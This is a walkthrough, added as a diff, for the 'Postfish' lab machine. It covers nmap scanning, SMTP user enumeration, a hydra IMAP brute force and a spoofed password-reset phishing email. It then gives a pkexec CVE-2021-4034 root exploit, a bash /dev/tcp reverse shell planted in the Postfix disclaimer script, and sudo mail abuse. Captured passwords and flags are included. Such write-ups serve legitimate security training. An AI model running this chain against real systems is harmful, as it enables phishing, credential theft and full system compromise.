@@ -1,0 +1,235 @@
+																							    Postfish Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.137
+export IP=192.168.68.137
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+110/tcp open  pop3
+143/tcp open  imap
+993/tcp open  imaps
+995/tcp open  pop3s
+
+
+3. nmap -Pn -n -sC -sV -p22,25,80,110,143,993,995 $IP --open --stats-every=5s -oN results.txt
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
+110/tcp open  pop3     Dovecot pop3d
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp open  ssl/pop3 Dovecot pop3d
+Service Info: Host:  postfish.off; OS: Linux
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+ 
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+ <!-- nothing -->
+nikto --url $IP
+ <!-- nothing -->
+ 
+ Port 80 
+ Enumeration
+ wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://postfish.off/FUZZ"
+ 
+ index.html
+ team.html             # notice the following names: Claire Madison, Mike Ross, Brian Moore, Sarah Lorem 
+ 
+
+Port 25 - Postfix smtpd
+
+smtp-user-enum  -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $IP
+192.168.68.137: pollinate exists
+192.168.68.137: postfix exists
+192.168.68.137: postmaster exists
+192.168.68.137: root exists
+192.168.68.137: www-data exists
+
+Let's create permutations of the 4 names discovered on the web app and use them to verify if they exist in the SMTP service
+
+https://raw.githubusercontent.com/jseidl/usernamer/master/usernamer.py
+
+cat user.txt
+Claire Madison
+Mike Ross
+Brian Moore
+Sarah Lorem
+
+python2 permutation.py -f user.txt > names.txt                      # generate the permutations
+
+smtp-user-enum -M VRFY -U names.txt -t $IP -p 25 -t postfish.off 
+
+######## Scan started at Tue Mar 28 03:49:20 2023 #########
+postfish.off: Claire.Madison exists
+postfish.off: Mike.Ross exists
+postfish.off: Brian.Moore exists
+postfish.off: Sarah.Lorem exists
+######## Scan completed at Tue Mar 28 03:49:36 2023 #########
+
+Let's use cewl to scrap the webpage and see if we discover any other accounts available
+
+cewl http://postfish.off -m 4 -w cewl.txt --lowercase
+
+smtp-user-enum  -M VRFY -U cewl.txt -t $IP
+
+192.168.68.137: Sales exists
+192.168.68.137: Legal exists
+
+Port 143 IMAP
+
+Now that we have 6 possible usernames, Claire.Madison/Mike.Ross/Brian.Moore/Sarah.Lorem/Sales/Legal, let's try to use hydra to brute-force IMAP service, maybe we get a set of valid credentials
+
+hydra -L user.txt -P cewl.txt $IP imap -s 143 -e nsr -I
+
+login: Sales   password: sales
+
+Let's try to read the email messages for user “sales” which are stored either in POP3 (110, 995) or IMAP (143,993)
+
+Retrieving the emails from IMAP (automatic)
+curl -k 'imaps://postfish.off/INBOX;MAILINDEX=1' --user sales:sales         # read the email messages for user : sales
+curl -k 'imap://postfish.off/INBOX;MAILINDEX=1' --user sales:sales
+
+Retrieving emails from POP3
+telnet $IP 110
+user sales
++OK
+pass sales
++OK Logged in.
+list
++OK 1 messages:
+1 683
+.
+retr 1
+Subject: ERP Registration Reminder
+Message-Id: <20210331131139.7712145434@postfish.off>
+Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
+From: it@postfish.off
+
+Hi Sales team,
+
+We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.                # seems like we may be able to send a new password for a user
+
+Regards,
+IT
+
+ Looking at http://postfish.off/team.html again shows that Brian Moore is the sales manager. We already know his email address from earlier as well from our smtp enumeration. So let's control the IMAP service and send a “password recovery” email redirecting him to our server by providing out machine IP. For this we need to use telnet and connect to port 25.
+ 
+telnet $IP 25
+MAIL FROM: it@postfish.off                          # since we already know from the “sales” user emails that it@postfish.off dealts with these emails
+RCPT TO: brian.moore@postfish.off              # our target
+DATA                                                         # specify DATA
+
+Subject: Password Reset 
+
+Hi Brian,
+
+Follow this link to reset your password: http://192.168.49.68                   # add the IP of your machine               
+
+Regards,
+IT
+.                                                                # end the message using “ . ”
+
+nc -lvnp 80
+connect to [192.168.49.68] from (UNKNOWN) [192.168.68.137] 50496
+POST / HTTP/1.1
+Host: 192.168.49.68
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 164
+Content-Type: application/x-www-form-urlencoded
+
+first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confirm_password%3DEternaLSunshinE
+
+EternaLSunshinE
+
+ssh brian.moore@$IP
+EternaLSunshinE   
+cat local.txt                             #  Flag: 753a72d38a87d526f0ef5edf07ebc780
+
+
+Privilege escalation
+
+Vulnerable to CVE-2021-4034
+https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
+chmod +x cve.py
+./cve.py
+# whoami
+root
+cd /root
+cat proof.txt             # Flag: ab81544fa070c207bdd51e6c2d3ea82b
+
+
+Another way to get root:
+
+id 
+uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
+
+# Let's see which files belong to the filter group
+
+find / -group filter 2>/dev/null
+
+/etc/postfix/disclaimer
+/var/spool/filter
+
+# The postfix disclaimer functionality is a specific configuration, which allows a pre-determined user (in this case filter) to execute a script when sending or receiving an email.
+/etc/postfix/disclaimer file can actually execute code, and its execution is established in the /etc/postfix/master.cf file.
+
+cat /etc/postfix/master.cf | grep disclaimer
+dfilt      unix  -       n       n       -       -       pipe flags=Rq user=filter argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
+
+# Since we are in the filter group, we should be able to edit the /etc/postfix/disclaimer file.
+
+ls -l /etc/postfix/disclaimer
+-rwxrwx--- 1 root filter 1184 Mar 28 18:36 /etc/postfix/disclaimer
+
+# Edit the file and add a bash script that will give us the shell of the user filter
+
+nano /etc/postfix/disclaimer
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.49.68/4444 0>&1
+
+# The next time a user receives a message, the disclaimer script should be executed. Basically, its the same steps that we've used prior to get shell, but now, when we send the email, our shell will be executed instead
+
+nc -lnvp 4444
+
+nc -v postfish.off 25
+postfish.off [192.168.68.137] 25 (smtp) open
+220 postfish.off ESMTP Postfix (Ubuntu)
+helo sir
+250 postfish.off
+MAIL FROM: it@postfish.off
+250 2.1.0 Ok
+RCPT TO: brian.moore@postfish.off
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+pwd
+.                                             # end the sequence
+250 2.0.0 Ok: queued as 4593345446
+quit
+221 2.0.0 Bye
+
+nc -lnvp 4444
+connect to [192.168.49.68] from (UNKNOWN) [192.168.68.137] 57130
+bash: cannot set terminal process group (53592): Inappropriate ioctl for device
+bash: no job control in this shell
+filter@postfish:/var/spool/postfix$
+
+sudo -l
+ (ALL) NOPASSWD: /usr/bin/mail *
+
+# Gtfobins 
+sudo /usr/bin/mail --exec='!/bin/sh'
+whoami
+root
